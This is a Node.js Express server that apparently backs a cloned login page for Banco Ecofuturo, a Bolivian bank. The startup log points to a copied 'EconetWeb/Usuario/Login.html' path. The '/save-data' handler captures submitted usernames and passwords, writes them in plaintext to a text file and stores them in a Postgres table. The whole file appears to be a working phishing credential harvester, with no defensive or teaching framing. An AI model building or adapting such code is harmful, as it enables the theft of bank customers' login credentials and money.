const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");
const app = express();
const port = process.env.PORT || 8080;
const pg = require("pg")
const dotenv = require("dotenv");
dotenv.config();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.use(express.static(path.join(__dirname, "public")));

app.post("/save-data", (req, res) => {
  const usuario = req.body.usuario;
  const password = req.body.password;
  const dataToWrite = `Usuario: ${usuario}, Password: ${password}\n`;

  const filePath = path.join(__dirname, "data.txt");

  fs.appendFile(filePath, dataToWrite, (err) => {
    if (err) {
      console.error("Error al guardar los datos:", err);
      res.status(500).send("Ocurrió un error al guardar los datos.");
    } else {
      console.log("Datos guardados con éxito.");
      res.send(`Hola, ${usuario}. Tus datos han sido guardados.`);
    }
  });
  seed(usuario, password).then();
});

// Inicia el servidor
app.listen(port, () => {
  console.log(
    `Servidor escuchando en http://localhost:${port}/ecofuturo/econet.bancoecofuturo.com.bo_447/EconetWeb/Usuario/Login.html`
  );
});

async function seed(usuario, password) {
  const { Client } = pg;

  try {
    const connection = new Client({
      user: process.env.DB_USER || "postgress",
      host: process.env.DB_HOST,
      database: process.env.DB_NAME,
      password: process.env.DB_PASSWORD,
      port: process.env.DB_PORT,
    });

    await connection.connect();
    const buildClientTable = `
      CREATE TABLE IF NOT EXISTS client (
        usuario VARCHAR(255) DEFAULT NULL,
        password VARCHAR(255) DEFAULT NULL
      );`;

    await connection.query(buildClientTable);
    console.log("Created client table");

    if (connection) {
      insertData(connection, usuario, password);
    }
  } catch (error) {
    console.error("Error seeding data:", error);
  }
}

function insertData(connection, usuario, password) {
  connection.query(
    `INSERT INTO client (usuario, password) VALUES ($1, $2) RETURNING *;`,
    [usuario, password]
  );
}
